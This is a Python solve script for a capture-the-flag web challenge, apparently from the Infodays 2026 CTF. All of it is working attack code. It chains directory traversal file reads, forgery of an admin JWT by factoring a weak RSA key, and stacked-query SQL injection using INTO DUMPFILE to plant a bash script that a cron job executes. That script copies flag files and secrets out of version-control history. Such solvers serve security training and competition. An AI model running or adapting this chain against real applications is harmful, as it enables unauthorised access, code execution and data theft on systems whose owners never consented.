#!/usr/bin/env python3
"""
YAMI SUKEHIRO — end-to-end solver (Infodays 2026 CTF, author: saamnolimits).

Chain:
  1. Register/login a knight account.
  2. Book a session → get appointment_id for /reminder.
  3. Directory traversal: GET /reminder/<id> (to initialize temp_dir) then
     GET /export/<traversal>  →  read files off the container FS.
  4. Read /opt/app/config/signature.py — confirm weak RSA generator. Decode
     current JWT cookie to lift n. Factor n (small prime q ≈ 2^20).
  5. Reconstruct private key, forge a JWT with role="captain".
  6. /captaindashboard?s=&o=DESC;...  — stacked-query SQLi via `order` param.
     Use MySQL SELECT ... INTO OUTFILE with FILE privilege to drop a script at
     /data/scripts/fixer-v99.sh that copies /flags/user.txt to an attacker-
     readable location. Wait ≤60s for the cron simulator to pick it up.
  7. Read the first flag (user.txt).
  8. Also drop a script that dumps /opt/hg_repo/.hg/store/data/config.py.i and
     related revlog content — extract CAPTAIN_SECRET from old revision.
  9. Read /flags/root.txt.enc, decrypt with openssl aes-256-cbc -pbkdf2.
 10. Print both flags.

Usage:
    python3 solve.py http://<host>:<port>
"""
import base64
import hashlib
import json
import re
import subprocess
import sys
import time

# Large JWTs (with ~1024-bit n embedded in jwk) push the stdlib email parser
# past its default recursion limit on Python 3.13+.
sys.setrecursionlimit(10000)
from datetime import datetime, timedelta, timezone
from urllib.parse import quote

import jwt
import requests
import sympy
from Crypto.PublicKey import RSA


def b64url_decode(seg: str) -> bytes:
    seg += '=' * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg)


def solve_pow(email: str, bits: int = 16, bucket_seconds: int = 300) -> str:
    """Mine a nonce so sha256(email:bucket:nonce_hex) starts with `bits`
    leading zero bits.  /login rejects without a valid X-PoW-Nonce."""
    bucket = str(int(time.time() // bucket_seconds))
    need_full = bits // 8
    need_extra = bits % 8
    mask = (0xff << (8 - need_extra)) & 0xff if need_extra else 0
    prefix_zero = b'\x00' * need_full
    n = 0
    t0 = time.time()
    while True:
        nonce_hex = f"{n:x}"
        d = hashlib.sha256(f"{email}:{bucket}:{nonce_hex}".encode()).digest()
        if d[:need_full] == prefix_zero and (not need_extra or (d[need_full] & mask) == 0):
            print(f"[+] PoW solved in {time.time()-t0:.2f}s ({n} attempts)")
            return nonce_hex
        n += 1


def recover_key(n: int):
    """Factor n using the weak-q-generator (q ≈ 2^20)."""
    # fastest: try sympy.factorint which handles small factors quickly
    factors = sympy.factorint(n)
    primes = list(factors.keys())
    if len(primes) != 2:
        raise RuntimeError(f"unexpected factorization: {factors}")
    p, q = sorted(primes)  # q is the small one
    e = 65537
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    return RSA.construct((n, e, d, q, p))


class Exploit:
    def __init__(self, base_url: str):
        self.base = base_url.rstrip('/')
        self.s = requests.session()   # knight session — used for /reminder + /export traversal
        self.adm = requests.session() # captain session — used for /captaindashboard SQLi
        self.email = f"attacker+{int(time.time())}@x.lab"
        self.password = "pwned"
        self.knight_tok: str | None = None

    def register_login(self):
        # clear stale auth cookie so /login issues a fresh JWT
        self.s.cookies.clear()
        self.s.post(f"{self.base}/register",
                    json={"email": self.email, "password": self.password})

        # Discover the PoW parameters from GET /login response headers,
        # then mine a nonce for THIS email + current bucket.
        head = self.s.get(f"{self.base}/login")
        bits = int(head.headers.get('X-PoW-Bits', '16'))
        bucket_secs = int(head.headers.get('X-PoW-Bucket-Seconds', '300'))
        nonce = solve_pow(self.email, bits=bits, bucket_seconds=bucket_secs)
        r = self.s.post(f"{self.base}/login",
                        json={"email": self.email, "password": self.password},
                        headers={"X-PoW-Nonce": nonce})
        r.raise_for_status()

    def book(self):
        r = self.s.post(f"{self.base}/book", data={
            "name": "Attacker", "email": self.email, "phone": "1",
            "date": "2026-06-01", "time": "10:00", "people": "1",
            "message": "x"
        })
        r = self.s.get(f"{self.base}/dashboard")
        m = re.search(r'/reminder/(\d+)', r.text)
        if not m:
            raise RuntimeError("no booking id found")
        self.aid = int(m.group(1))
        print(f"[+] booking id = {self.aid}")

    def read_file(self, target: str, _retries: int = 2) -> bytes | None:
        """stateful: /reminder/<id> then /export/../<target>"""
        r = self.s.get(f"{self.base}/reminder/{self.aid}",
                       allow_redirects=False)
        loc = r.headers.get('location', '')
        if not (r.status_code == 302 and '/export/' in loc):
            if _retries <= 0:
                raise RuntimeError(f"reminder not returning /export (loc={loc})")
            # session expired or booking gone — re-login and re-book, then retry
            self.register_login()
            self.book()
            return self.read_file(target, _retries - 1)
        url = f"{self.base}/export/" + "../" * 8 + target.lstrip('/')
        # need to keep the literal ".." so build the request manually
        req = requests.Request('GET', url)
        prep = self.s.prepare_request(req)
        prep.url = url
        r = self.s.send(prep, allow_redirects=False)
        if r.status_code == 200:
            return r.content
        return None

    def forge_captain_jwt(self):
        tok = self.s.cookies.get('X-AUTH-Token')
        header, payload, _ = tok.split('.')
        claims = json.loads(b64url_decode(payload))
        n = int(claims['jwk']['n'])
        print(f"[+] lifted n from JWT (bits={n.bit_length()})")
        key = recover_key(n)
        print(f"[+] factored n ; constructing captain JWT")
        new_claims = {
            "email": self.email,
            "role": "captain",
            "iat": datetime.now(timezone.utc),
            "exp": datetime.now(timezone.utc) + timedelta(hours=1),
            "jwk": claims['jwk'],
        }
        pem = key.export_key()
        self.captain_tok = jwt.encode(new_claims, pem, algorithm='RS256')
        # Use a SEPARATE session for the captain JWT so the knight session
        # (and its booking) remain valid for the read_file primitive.
        self.adm.cookies.clear()
        self.adm.cookies.set('X-AUTH-Token', self.captain_tok)
        r = self.adm.get(f"{self.base}/captaindashboard", allow_redirects=False)
        assert r.status_code == 200, f"captain dashboard returned {r.status_code}"
        print("[+] captain JWT accepted")

    def sqli_write_file(self, remote_path: str, content: str):
        """Stacked-query SELECT ... INTO DUMPFILE — needs FILE privilege.
        DUMPFILE writes raw bytes (unlike OUTFILE which escapes \\n as '\\n')."""
        hex_blob = content.encode().hex()
        payload = f"DESC; SELECT UNHEX('{hex_blob}') INTO DUMPFILE '{remote_path}' -- "
        r = self.adm.get(f"{self.base}/captaindashboard",
                         params={"s": "", "o": payload})
        print(f"[+] wrote {remote_path} via SQLi (HTTP {r.status_code})")

    def wait_for_read(self, path: str, timeout=120, min_size: int = 1) -> bytes | None:
        """poll via directory-traversal until path exists and has ≥ min_size bytes."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            data = self.read_file(path)
            if data is not None and len(data) >= min_size:
                return data
            time.sleep(5)
        return None

    def rce_grab_flag(self):
        # MySQL INTO DUMPFILE refuses to overwrite, so use a unique tag per run.
        # `sort -V | tail -n 1` picks the highest version, so as long as our tag
        # monotonically increases it always wins.
        tag = str(int(time.time()))
        u_path = f'/tmp/u_{tag}.out'
        r_path = f'/tmp/r_{tag}.out'
        h_path = f'/tmp/h_{tag}.out'
        fixer = (
            "#!/bin/bash\n"
            f"cp /flags/user.txt {u_path}\n"
            f"cp /flags/root.txt.enc {r_path}\n"
            f"cd /opt/hg_repo && hg cat -r 0 config.py > {h_path} 2>/dev/null\n"
        )
        self.sqli_write_file(f'/data/scripts/fixer-v{tag}.sh', fixer)
        # dbstatus.json gets removed by the cron runner after each tick, so a
        # write here succeeds on any subsequent run of the solver.
        self.sqli_write_file('/data/scripts/dbstatus.json',
                             '{"status": "stale"}')
        self._u_path, self._r_path, self._h_path = u_path, r_path, h_path
        print("[+] waiting for cron to pick up fixer (≤ 60s)...")
        u = self.wait_for_read(self._u_path)
        if u is None:
            raise RuntimeError("timed out waiting for fixer execution")
        self.flag1 = u.decode().strip()
        print(f"[+] FLAG1 = {self.flag1}")

        r = self.wait_for_read(self._r_path, timeout=30, min_size=16)
        if r is None:
            raise RuntimeError("could not read root.txt.enc copy")
        with open('/tmp/root.txt.enc', 'wb') as f:
            f.write(r)

        hg = self.wait_for_read(self._h_path, timeout=30, min_size=64)
        if hg is None:
            raise RuntimeError("could not read hg cat output")
        # hg cat -r 0 config.py reveals the original commit with the secret
        m = re.search(rb'CAPTAIN_SECRET\s*=\s*"([0-9a-f]+)"', hg)
        if not m:
            raise RuntimeError(f"CAPTAIN_SECRET not found in: {hg[:200]!r}")
        self.captain_secret = m.group(1).decode()
        print(f"[+] CAPTAIN_SECRET = {self.captain_secret}")

    def decrypt_root(self):
        out = subprocess.check_output([
            'openssl', 'enc', '-aes-256-cbc', '-d', '-pbkdf2',
            '-pass', f'pass:{self.captain_secret}',
            '-in', '/tmp/root.txt.enc',
        ])
        self.flag2 = out.decode().strip()
        print(f"[+] FLAG2 = {self.flag2}")


def main():
    if len(sys.argv) != 2:
        print("Usage: solve.py http://host:port")
        sys.exit(1)
    x = Exploit(sys.argv[1])
    x.register_login()
    x.book()
    # sanity: read /etc/crontab to confirm traversal works
    ct = x.read_file('/etc/crontab')
    assert ct and b'data/scripts' in ct, "directory traversal broken"
    print("[+] /etc/crontab read confirmed")
    x.forge_captain_jwt()
    x.rce_grab_flag()
    x.decrypt_root()
    print("\n=== RESULT ===")
    print(f"user flag: {x.flag1}")
    print(f"root flag: {x.flag2}")


if __name__ == '__main__':
    main()
